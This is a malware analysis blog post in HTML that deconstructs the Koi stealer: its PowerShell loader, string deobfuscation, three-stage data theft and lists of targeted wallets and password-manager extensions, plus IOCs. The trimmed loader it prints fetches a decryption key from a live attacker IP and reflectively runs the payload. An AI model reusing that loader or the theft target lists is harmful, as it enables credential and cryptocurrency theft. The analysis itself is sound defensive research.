@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html><head lang="en">
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>A Deconstruction of Koi Stealer - Malware Analysis - Pygrum</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="Overview Koi stealer samples began appearing on any.run in mid-late february. The samples identified as Koi are mostly Powershell scripts, including the one I analysed.
+Note: Koi stealer should not be confused with AZORult. From what I&rsquo;ve identified, they are two distinct families, and not even written in the same language. Koi is written in C# while AZORult 2019 is written in C&#43;&#43;.
+The stealer performs basic system checks before stealing various data in 3 stages - browser data, including passwords, cryptocurrency wallet and password manager data, some application data, and other files of interest." />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="A Deconstruction of Koi Stealer - Malware Analysis" />
+<meta property="og:description" content="Overview Koi stealer samples began appearing on any.run in mid-late february. The samples identified as Koi are mostly Powershell scripts, including the one I analysed.
+Note: Koi stealer should not be confused with AZORult. From what I&rsquo;ve identified, they are two distinct families, and not even written in the same language. Koi is written in C# while AZORult 2019 is written in C&#43;&#43;.
+The stealer performs basic system checks before stealing various data in 3 stages - browser data, including passwords, cryptocurrency wallet and password manager data, some application data, and other files of interest." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://pygrum.github.io/posts/koi-stealer/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-04-08T15:27:05+01:00" />
+<meta property="article:modified_time" content="2024-04-08T15:27:05+01:00" /><meta property="og:site_name" content="Pygrum" />
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="A Deconstruction of Koi Stealer - Malware Analysis"/>
+<meta name="twitter:description" content="Overview Koi stealer samples began appearing on any.run in mid-late february. The samples identified as Koi are mostly Powershell scripts, including the one I analysed.
+Note: Koi stealer should not be confused with AZORult. From what I&rsquo;ve identified, they are two distinct families, and not even written in the same language. Koi is written in C# while AZORult 2019 is written in C&#43;&#43;.
+The stealer performs basic system checks before stealing various data in 3 stages - browser data, including passwords, cryptocurrency wallet and password manager data, some application data, and other files of interest."/>
+<script src="https://pygrum.github.io/js/feather.min.js"></script>
+	
+	
+        <link href="https://pygrum.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="https://pygrum.github.io/css/main.9c40cac2f9d1ada2d69a950e08f0523bb5bb23371ce7e8b3d157b2178d74abe6.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="https://pygrum.github.io/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css"   />
+	
+
+	
+	
+
+	
+	
+	
+	
+		
+		
+		<link rel="stylesheet" type="text/css" href="https://pygrum.github.io/css/extended.47c16d04bef5a8ac0e64f9b08e1d6f6f8a429b1d07716e3c0984ca36a2671bc1.css">
+		
+	<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+	<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+	<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+	<link rel="manifest" href="/site.webmanifest">
+	<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+	<link rel="alternate" type="application/rss+xml" href="https://pygrum.github.io//index.xml" title="Pygrum">
+	<meta name="msapplication-TileColor" content="#da532c">
+	<meta name="theme-color" content="#ffffff">	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="https://pygrum.github.io/">Pygrum</a>
+	</div>
+	<nav>
+		
+		<a href="/about/">About</a>
+		
+		<a href="/tags">Tags</a>
+		
+		<a href="/posts/">Posts</a>
+		
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">A Deconstruction of Koi Stealer - Malware Analysis</h1>
+			<div class="meta">Posted on Apr 8, 2024</div>
+		</div>
+		
+
+		<section class="body">
+			<h2 id="overview">Overview</h2>
+<p>Koi stealer samples began appearing on <a href="https://any.run">any.run</a> in mid-late february. The samples identified as Koi are mostly Powershell scripts, including the one I analysed.</p>
+<blockquote>
+<p>Note: Koi stealer should not be confused with AZORult. From what I&rsquo;ve identified, they are two distinct families, and not even written in the same language. Koi is written in C# while AZORult 2019 is written in C++.</p>
+</blockquote>
+<p>The stealer performs basic system checks before stealing various data in 3 stages - browser data, including passwords, cryptocurrency wallet and password manager data, some application data, and other files of interest. A full list of sources that the malware steals from is included at the end of this report.</p>
+<h3 id="details">Details</h3>
+<p>Details about the main implant:</p>
+<ul>
+<li>Sample source: <a href="https://app.any.run/tasks/0c21f3f8-9f51-44ae-9d5e-5a67a29cd9f9/">https://app.any.run/tasks/0c21f3f8-9f51-44ae-9d5e-5a67a29cd9f9/</a></li>
+<li>Sample type: Intel 80386 (x86) .NET Assembly</li>
+<li>First submission (VT): 2024-03-28 14:47:02 UTC</li>
+</ul>
+<h2 id="powershell-loader">Powershell Loader</h2>
+<p>Below is a trimmed version of the loader script.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>[<span style="color:#66d9ef">byte[]</span>] $binary = 0x0e,
+</span></span><span style="display:flex;"><span>0x1d, 0xa9, 0x47, 0x45, 0x63, 0x55, 0x39, 0x69, 0x75, 0x46, 0x74, 0xc7, 0xad, 0x46, 0x72,
+</span></span><span style="display:flex;"><span>0xd7, 0x6f, 0x48, 0x58, 0x43, 0x47, 0x39, 0x47, 0x06, 0x63, 0x55, 0x39, 0x6d, 0x75, 0x46,
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>0x39, 0x6d, 0x75, 0x46, 0x74, 0x38, 0x52, 0x46, 0x72, 0x6f, 0x6f, 0x48, 0x58, 0x43, 0x47,
+</span></span><span style="display:flex;"><span>0x39, 0x47, 0x46, 0x63, 0x55, 0x39, 0x6d, 0x75, 0x46, 0x74, 0x38, 0x52, 0x46, 0x72, 0x6f,
+</span></span><span style="display:flex;"><span>0x6f, 0x48, 0x58, 0x43, 0x47, 0x39, 0x47, 0x46, 0x63, 0x55, 0x39, 0x6d, 0x75, 0x46, 0x74
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># [Net.ServicePointManager]::SecurityProtocol +=&#39;tls12&#39;</span>
+</span></span><span style="display:flex;"><span>$guid = (Get-ItemProperty -Path HKLM<span style="color:#960050;background-color:#1e0010">:</span>\SOFTWARE\Microsoft\Cryptography).MachineGuid
+</span></span><span style="display:flex;"><span>$config = (new-object net.webclient).downloadstring(<span style="color:#e6db74">&#34;http://195.123.220.40/index.php?id=</span>$guid<span style="color:#e6db74">&amp;subid=ENmpj9mb&#34;</span>).Split(<span style="color:#e6db74">&#39;|&#39;</span>)
+</span></span><span style="display:flex;"><span>$k = $config[<span style="color:#ae81ff">0</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ($i = <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">-lt</span> $binary.Length ; ++$i)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	$binary[$i] = $binary[$i] <span style="color:#f92672">-bxor</span> $k[$i % $k.Length]
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$sm = [<span style="color:#66d9ef">System.Reflection.Assembly</span>]::Load($binary)
+</span></span><span style="display:flex;"><span>$ep = $sm.EntryPoint
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ep.Invoke($null, (, [<span style="color:#66d9ef">string[]</span>] ($config[<span style="color:#ae81ff">1</span>], $config[<span style="color:#ae81ff">2</span>], $config[<span style="color:#ae81ff">3</span>])))
+</span></span></code></pre></div><p>It contains a large byte buffer (<code>$binary</code>) that is XOR decrypted using a plaintext configuration received from the malicious server (<code>195.123.220.40</code>), and loaded as an assembly. Some of the configuration is passed into the assembly as arguments. I managed to retrieve this configuration from the server, using a fake GUID:</p>
+<p><img src="images/loader-config-response.png" alt="config-response"></p>
+<p>We can deduct what each item in the configuration represents:</p>
+<ul>
+<li><code>CG9GFcU9muFt8RFrooHX</code>: XOR key for decrypting the .NET payload</li>
+<li><code>ENmpj9mb</code>: possibly an ID for this particular infection. This may have been the value used to determine the correct encryption key to send. Notice that it was used as the <code>subid</code> parameter in the download string</li>
+<li><code>http://195.123.220.40/index.php</code>: The malicious server endpoint. This is passed as an argument to the malware so that it knows where to call back to</li>
+</ul>
+<p>Using this configuration, we can write a generic script to decrypt and dump the PE ourselves without running it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">4</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Usage:&#34;</span>, sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>], <span style="color:#e6db74">&#34;[path-to-encrypted-pe] [path-to-config] [save-path]&#34;</span>)
+</span></span><span style="display:flex;"><span>        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>        config <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>        config <span style="color:#f92672">=</span> config<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;|&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    key <span style="color:#f92672">=</span> config[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>    decoded <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(data)):
+</span></span><span style="display:flex;"><span>        decoded<span style="color:#f92672">.</span>append(data[i] <span style="color:#f92672">^</span> key[i <span style="color:#f92672">%</span> len(key)])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(decoded) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">and</span> decoded[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x4D</span> <span style="color:#f92672">and</span> decoded[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x5A</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;successful decoding! The resulting PE is valid.&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;the decoded result is not a valid PE file.&#34;</span>)
+</span></span><span style="display:flex;"><span>        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">3</span>], <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>        f<span style="color:#f92672">.</span>write(bytes(decoded))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;decoded PE saved to&#34;</span>, sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">3</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><h2 id="main-payload-analysis">Main Payload Analysis</h2>
+<p>Loading the sample into <code>dnSpy</code>, we can tell that it&rsquo;s a little hard to read the source code due to names / symbols being stripped.
+We start by executing <a href="https://github.com/de4dot/de4dot">de4dot</a> on the payload to fix up the naming and improve readability.<br>
+Peeking at the <code>Main</code> method, there seems to be some basic string obfuscation in place. All assigned strings are received from calls to distinct methods.</p>
+<p><img src="images/string-obf.png" alt="string-obfuscation"></p>
+<p>&hellip;and each method looks like this:</p>
+<p><img src="images/string-deobf.png" alt="string-deobfuscation"></p>
+<p>All strings are stored in separate class, in a large byte buffer, which is XOR decrypted at runtime:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cs" data-lang="cs"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> Class7()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">0</span>; i &lt; Class7.byte_0.Length; i++)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// byte_0 is the buffer storing all string bytes</span>
+</span></span><span style="display:flex;"><span>		Class7.byte_0[i] = (<span style="color:#66d9ef">byte</span>)((<span style="color:#66d9ef">int</span>)Class7.byte_0[i] ^ i ^ <span style="color:#ae81ff">170</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Each string de-obfuscation function calls a single underlying method to fetch the string from the large byte buffer.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cs" data-lang="cs"><span style="display:flex;"><span><span style="color:#75715e">// Token: 0x0600007A RID: 122 RVA: 0x0001B014 File Offset: 0x00019214</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">string</span> smethod_0(<span style="color:#66d9ef">int</span> int_0, <span style="color:#66d9ef">int</span> int_1, <span style="color:#66d9ef">int</span> int_2)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">string</span> @string = Encoding.UTF8.GetString(Class7.byte_0, int_1, int_2);
+</span></span><span style="display:flex;"><span>	Class7.string_0[int_0] = @string;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> @string;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Notice the method token highlighted in the previous image. Provided with method tokens, <code>de4dot</code> can directly resolve the method to the returned value, meaning we can inline the obfuscated strings. We just need to specify the method tokens for all deobfuscation methods. Thankfully, they are all defined in-order. We can take the tokens of the first and last methods, and resolve the rest of them (since the tokens are numeric, we can increment from the first to the last to generate the other tokens). Here&rsquo;s a script to generate the <code>de4dot</code> command to do this in one go.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">4</span>:
+</span></span><span style="display:flex;"><span>	print(<span style="color:#e6db74">&#34;usage:&#34;</span>, sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>], <span style="color:#e6db74">&#34;[binary-name] [first-token] [last-token]&#34;</span>)
+</span></span><span style="display:flex;"><span>	sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>bin <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>first <span style="color:#f92672">=</span> int(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>last <span style="color:#f92672">=</span> int(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">3</span>], <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;de4dot &#34;</span> <span style="color:#f92672">+</span> bin <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; --strtyp delegate&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(first, last<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>):
+</span></span><span style="display:flex;"><span>    cmd <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34; --strtok &#34;</span> <span style="color:#f92672">+</span> str(hex(i))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(cmd)
+</span></span></code></pre></div><p>Now we can load a cleaned version back into <code>dnSpy</code> for a full examination.</p>
+<h2 id="initialisation">Initialisation</h2>
+<p>On initialisation, a global named mutex is created to prevent two instances of Koi stealer from running at once. The authors also tried to prevent it from activating in the following countries: Azerbaijan, Armenia, Belarus, Kazakhstan, Kyrgyzstan, Moldova, Russia, Tajikistan, Turkmenistan, Uzbekistan, Ukraine.</p>
+<p>I named this analysed function <code>IsBadEnvironment</code> because on returning <code>true</code>, execution stops and the stealer exits.</p>
+<p><img src="images/bad-env.png" alt="bad-env"></p>
+<p>The malware then checks for the existence of certain file paths, hostnames, usernames, and more, likely to determine whether it is in a sandbox.<br>
+Next, basic system information is gathered. Each system is given a unique ID, which is the <code>MachineGuid</code> from <code>SOFTWARE\\Microsoft\\Cryptography</code>. Gathered information includes:</p>
+<ul>
+<li>PC name</li>
+<li>Username</li>
+<li>Domain name</li>
+<li>CPU information</li>
+<li>GPU information</li>
+<li>Installed RAM</li>
+<li>Screen information</li>
+<li>Language and timezone settings</li>
+<li>OS information</li>
+<li>Installed antivirus</li>
+<li>Installed programs</li>
+</ul>
+<h2 id="exfiltration">Exfiltration</h2>
+<p>After this information gathering stage, the heavy data collection / exfiltration begins. Stolen data is encrypted and <code>POST</code>ed to the server provided as an argument to the stealer. Data is exfiltrated in 3 stages, with the end of each stage indicated by log strings in the malware itself.</p>
+<p><img src="images/stages.png" alt="stages"></p>
+<p>After sending stage 1, the malware saves the server response. I have not retrieved or analysed the response, but could decipher what it contained based on how the return values were used in the malware. The received response is likely a configuration for the 3rd and final stage.</p>
+<p>After sending stage 2, the response from stage 1 is interpreted as a command to execute a further payload, before gathering the remaining data to be sent as stage 3. This extra payload is likely determined by the operator. I believe that this feature was created mainly to deploy ransomware, as we have seen <a href="https://www.zscaler.com/resources/security-terms-glossary/what-is-double-extortion-ransomware">double extortion</a> becoming an increasingly popular method of cyberattack.</p>
+<h3 id="stage-one">Stage One</h3>
+<p>In stage one, the malware steals data from browsers and various applications. These are Mozilla Firefox, Microsoft Edge, Google Chrome, Brave Browser, and Opera Browser. The data targeted is as follows:</p>
+<ul>
+<li>Website cookies</li>
+<li>Saved passwords</li>
+<li>Form / web data (autocomplete)</li>
+<li>Browser history</li>
+<li>Crypto wallet extension data</li>
+<li>Password manager extension data</li>
+<li>TOTP provider data</li>
+<li>Application data
+<ul>
+<li>Binance</li>
+<li>Authy</li>
+<li>Windows Authenticator</li>
+<li>Skype (cookies)</li>
+<li>Sticky Notes</li>
+</ul>
+</li>
+</ul>
+<p>Browser data theft methods are shown through in the following screenshots.</p>
+<p><img src="images/cookies.png" alt="cookies"></p>
+<p><img src="images/login.png" alt="logins">
+<em>Note: SQLite3 login databases are decrypted and credentials are exfiltrated as part of stage 2</em></p>
+<p><img src="images/web.png" alt="web"></p>
+<p><img src="images/history.png" alt="history"></p>
+<p>Application data theft sees known sensitive files being stolen, e.g. WinAuth&rsquo;s <code>winauth.xml</code>. A full list of apps and extensions targeted is available at the end of this article.</p>
+<p>The methods I named as <code>SaveXData</code> and <code>Log</code> simply write data into a memory stream. There are two memory streams; one for stolen data, and the other for logging (particularly errors). For example, each time the malware attempts to steal file data, it attempts to remove access rules, copy the file to another location, read the copied file, and then delete it. If it fails at any point during this procedure, comprehensive error information is written to the logging stream, including the file&rsquo;s access rule and the exception message, as shown below.</p>
+<p><img src="images/err.png" alt="errors"></p>
+<h3 id="stage-two">Stage Two</h3>
+<p>In stage two, more applications are targeted. The following data is exfiltrated:</p>
+<ul>
+<li>Telegram data</li>
+<li>OpenVPN (.ovpn) files</li>
+<li>WinSCP credential data</li>
+<li>Steam data</li>
+<li>FileZilla credential data</li>
+<li>Discord data</li>
+<li>and&hellip;a single screenshot</li>
+</ul>
+<h3 id="stage-three">Stage Three</h3>
+<p>Before stage 3 exfiltration commences, and depending on the configuration received before stage 2, Koi stealer can act as a dropper for further payloads, which I theorised was a feature likely incorporated for double extortion tactics. The name of the command is <code>LDR</code>, hence why Koi stealer may be referred to as Koi Loader by some. Below is a table describing the configuration received after stage 1. I haven&rsquo;t yet deciphered the purposes of the fields marked <code>unknown</code>.</p>
+<table>
+<thead>
+<tr>
+<th>Position</th>
+<th>Represents</th>
+<th>Values</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>Opcode</td>
+<td><code>LDR</code></td>
+</tr>
+<tr>
+<td>1</td>
+<td>Loading conditions</td>
+<td><code>OR</code>, <code>AND</code>, <code>DO</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td>Unknown</td>
+<td><code>On</code>, <code>Off</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td>Unknown</td>
+<td>Hostnames</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Payload endpoint</td>
+<td>URI</td>
+</tr>
+<tr>
+<td>5</td>
+<td>Outfile</td>
+<td>Filename</td>
+</tr>
+</tbody>
+</table>
+<p><img src="images/ldr.png" alt="loader"></p>
+<p>In stage 3, files in the victim&rsquo;s Documents, Desktop and Downloads folders are targeted. Any file matching any of the values in the list below is exfiltrated.</p>
+<ul>
+<li>UTC—20*</li>
+<li>*.txt</li>
+<li>*.kdbx</li>
+<li>*.axx</li>
+<li>*.docx</li>
+<li>*.doc</li>
+<li>*.xlsx</li>
+<li>*.xls</li>
+<li>*backup*</li>
+<li>*two-fa*</li>
+<li>*wallet*</li>
+<li>*secret*</li>
+<li>*ledger*</li>
+<li>*trezor*</li>
+<li>*safepal*</li>
+<li>*paper-wallet-*.png</li>
+</ul>
+<p><img src="images/stage-3.png" alt="stage-3"></p>
+<h2 id="final-remarks">Final Remarks</h2>
+<p>The malware author is not at all advanced, development-wise, as the disassembled code contains some badly designed components and inefficiently implemented logic. Furthermore, there wasn&rsquo;t as wide a range of targeted browsers as has been observed from other stealers. Threat-wise, the malware steals a vast range of data, and there would be a serious breach of confidentiality if it was deployed successfully as part of an attack.</p>
+<h2 id="iocs">IOCs</h2>
+<h3 id="host-based-iocs">Host-based IOCs</h3>
+<ul>
+<li><code>Global\\ecf29fd5-211d-4165-96e7-069c4def74ce</code>: This mutex is created on execution, and before any malicious activity</li>
+</ul>
+<h3 id="network-based-iocs">Network-based IOCs</h3>
+<ul>
+<li><code>195.123.220.40</code>: Endpoint used by this particular sample</li>
+</ul>
+<h2 id="full-details">Full Details</h2>
+<h3 id="targeted-browsers">Targeted browsers</h3>
+<ul>
+<li>Firefox</li>
+<li>Edge</li>
+<li>Chrome</li>
+<li>Brave</li>
+<li>Opera</li>
+</ul>
+<h3 id="targeted-wallets">Targeted wallets</h3>
+<ul>
+<li>MetaMask</li>
+<li>MetaMask Edge</li>
+<li>MetaMask OperaGX</li>
+<li>Ronin</li>
+<li>Ronin Edge</li>
+<li>TronLink</li>
+<li>Liquality</li>
+<li>Keplr</li>
+<li>Keplr Edge</li>
+<li>NeoLine</li>
+<li>Polymesh</li>
+<li>Clover</li>
+<li>Sollet</li>
+<li>ICONex</li>
+<li>Temple</li>
+<li>Coin98</li>
+<li>Auro</li>
+<li>Cyano</li>
+<li>SafePal</li>
+<li>SafePal Edge</li>
+<li>Binance Chain</li>
+<li>Trust Wallet</li>
+<li>Phantom</li>
+<li>Solflare</li>
+<li>MultiversX</li>
+<li>MetaWallet</li>
+<li>MetaWallet Edge</li>
+<li>XDEFI</li>
+<li>OKX</li>
+<li>OKX Edge</li>
+<li>iWallet</li>
+<li>Math</li>
+<li>Math Edge</li>
+<li>Wombat</li>
+<li>Cradle</li>
+<li>Waves Keeper</li>
+<li>Slope Finance</li>
+<li>ONTO</li>
+<li>Hiro</li>
+<li>Plug</li>
+<li>Monsta</li>
+<li>Guarda</li>
+<li>Exodus</li>
+<li>GameStop</li>
+<li>BitKeep</li>
+<li>Rise</li>
+<li>Martian</li>
+<li>Argent X</li>
+<li>SubWallet</li>
+<li>Fewcha</li>
+<li>Petra Aptos</li>
+<li>Braavos</li>
+<li>Braavos Edge</li>
+<li>Nami</li>
+<li>ZilPay</li>
+<li>Rabby</li>
+<li>Harmony</li>
+<li>MOBOX</li>
+<li>Crust</li>
+<li>Pali</li>
+<li>TON</li>
+<li>Oasis</li>
+<li>Talisman</li>
+<li>Cosmostation</li>
+<li>Crypto.com</li>
+<li>Crypto.com Edge</li>
+<li>Stargazer</li>
+<li>Ecto</li>
+<li>Fractal</li>
+<li>BitClip</li>
+<li>Steem</li>
+<li>Nash</li>
+<li>Byone</li>
+<li>Hycon Lite</li>
+<li>GeroWallet</li>
+<li>EVER</li>
+<li>Earth</li>
+<li>Nabox</li>
+<li>X-Wallet</li>
+<li>Twetch</li>
+<li>BOLT X</li>
+<li>AlgoSigner</li>
+<li>Tronium</li>
+<li>Equal</li>
+<li>Nifty</li>
+<li>Nightly</li>
+<li>OneKey</li>
+<li>OneKey Edge</li>
+<li>Typhon</li>
+<li>KHC</li>
+<li>Jelly</li>
+<li>TezBox</li>
+<li>PIP</li>
+<li>Ale</li>
+<li>Zecrey</li>
+<li>ArConnect</li>
+<li>StarMask</li>
+<li>HashPack</li>
+<li>KardiaChain</li>
+<li>Taho</li>
+<li>Pontem</li>
+<li>Leap Terra</li>
+<li>Sender</li>
+<li>Surf</li>
+<li>Leap Cosmos</li>
+<li>HAVAH</li>
+<li>Eternl</li>
+<li>Finnie</li>
+<li>GuildWallet</li>
+<li>Sui</li>
+<li>Suiet</li>
+<li>SenSui</li>
+<li>Glass</li>
+<li>Morphis</li>
+<li>Goby</li>
+<li>Halo</li>
+<li>Polkadot.js</li>
+<li>Glow</li>
+<li>Glow Edge</li>
+<li>Ethos Sui</li>
+<li>Ethos Sui Edge</li>
+<li>Fluent</li>
+<li>Fluent Edge</li>
+<li>Casper</li>
+<li>CasperSigner</li>
+<li>Saturn</li>
+<li>BitApp</li>
+<li>Unisat</li>
+<li>MEW CX</li>
+<li>Enkrypt</li>
+<li>Enkrypt Edge</li>
+<li>Yoroi</li>
+<li>Yoroi Edge</li>
+<li>Jaxx Liverty</li>
+<li>MantaGlobal\ecf29fd5-211d-4165-96e7-069c4def74ce</li>
+</ul>
+<h3 id="other-targeted-extensions">Other targeted extensions</h3>
+<ul>
+<li>TOTP Authenticator</li>
+<li>2FA Authenticator</li>
+<li>Open 2FA Authenticator</li>
+<li>GAuth Authenticator</li>
+<li>KeePassXC-Browser</li>
+<li>Microsoft Autofill</li>
+<li>iCloud Passwords</li>
+<li>iCloud Passwords Edge</li>
+<li>Dropbox Passwords</li>
+<li>Dropbox Passwords Edge</li>
+<li>NordPass</li>
+<li>DualSafe</li>
+<li>DualSafe Edge</li>
+<li>Bitwarden</li>
+<li>Bitwarden Edge</li>
+<li>KeePass Tusk</li>
+<li>Avira</li>
+<li>Avira Edge</li>
+<li>LastPass</li>
+<li>LastPass Edge</li>
+<li>Dashlane</li>
+<li>Dashlane Edge</li>
+<li>TrueKey</li>
+<li>TrueKey Edge</li>
+<li>RoboForm</li>
+<li>RoboForm Edge</li>
+<li>Norton</li>
+<li>Norton Edge</li>
+<li>Keeper</li>
+<li>Keeper Edge</li>
+<li>Kee</li>
+<li>Kee Edge</li>
+<li>ExpressVPN Keys</li>
+<li>MultiPassword</li>
+<li>ESET</li>
+<li>ESET Edge</li>
+<li>1Password</li>
+<li>1Password Edge</li>
+<li>1Password Beta</li>
+<li>Password Manager Pro</li>
+<li>Enpass</li>
+<li>Enpass Edge</li>
+<li>SaasPass</li>
+<li>Passbolt</li>
+<li>Passbolt Edge</li>
+<li>F-Secure</li>
+<li>F-Secure Edge</li>
+<li>NextCloud</li>
